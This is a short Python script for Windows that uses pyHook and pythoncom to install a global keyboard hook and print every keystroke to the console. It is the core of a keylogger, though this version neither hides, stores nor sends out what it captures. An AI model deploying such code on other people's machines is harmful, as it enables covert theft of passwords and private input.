import pythoncom
import pyHook

current_window = None

def KeyStroke(event):
	global current_window

	# if they pressed a standard key
	if event.Ascii > 32 and event.Ascii < 127:
		print(chr(event.Ascii))
	else:
		print('[%s]' % event.Key)

	return True


# create hook
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

# register hook and run forever
kl.HookKeyboard()
pythoncom.PumpMessages()
